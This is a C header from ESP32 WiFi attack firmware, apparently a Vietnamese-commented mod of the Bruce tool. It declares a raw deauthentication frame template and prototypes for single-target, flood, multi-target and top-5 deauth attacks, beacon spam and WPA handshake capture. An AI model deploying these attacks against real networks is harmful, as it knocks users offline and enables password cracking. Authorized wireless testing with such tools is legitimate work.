#ifndef __WIFI_ATKS_H__
#define __WIFI_ATKS_H__

#include <WiFi.h>
#include <vector>

// --- CẤU TRÚC FRAME NAGAMI ULTIMATE ---
// Định nghĩa struct để quản lý gói tin chính xác đến từng byte
typedef struct {
    uint8_t frame_ctrl[2];
    uint8_t duration[2];
    uint8_t da[6];
    uint8_t sa[6];
    uint8_t bssid[6];
    uint8_t seq[2];
    uint8_t reason[2];
} __attribute__((packed)) nagami_frame_t;

// --- BIẾN NGOẠI VI (EXTERN) ---
extern wifi_ap_record_t ap_record;
extern const uint8_t _default_target[6];
extern uint8_t deauth_frame[]; 
extern uint8_t targetBssid[6];

// Mảng mẫu cũ của Bruce (vẫn giữ để đảm bảo tương thích các hàm cũ)
const uint8_t deauth_frame_default[] = {0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff,
                                        0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                        0x00, 0x00, 0x00, 0x00, 0xf0, 0xff, 0x02, 0x00};

// --- CÁC HÀM THỰC THI (PROTOTYPES) ---

// Lõi bắn Deauth Nagami (Cần khai báo để các hàm khác gọi được)
void nagami_fire(uint8_t* victim_mac, uint8_t* ap_bssid);

// Các hàm gốc của Bruce
void send_raw_frame(const uint8_t *frame_buffer, int size);
void wsl_bypasser_send_raw_frame(const wifi_ap_record_t *ap_record, uint8_t chan, const uint8_t target[6] = _default_target);

// Giao diện và Menu
void wifi_atk_info(String tssid, String mac, uint8_t channel);
void wifi_atk_menu();
void target_atk_menu(String tssid, String mac, uint8_t channel);

// Chế độ Deauth Single (Đã mod Nagami)
void target_atk(String tssid, String mac, uint8_t channel);

// Các tính năng khác
void capture_handshake(String tssid, String mac, uint8_t channel);
void beaconAttack();
void deauthFloodAttack();

// Chế độ Multi và Top 5 (Lõi Nagami)
void deauthTop5Attack();
void deauthMultiAttack();
void execute_multi_bruce_style(const std::vector<wifi_ap_record_t>& targets);

#endif
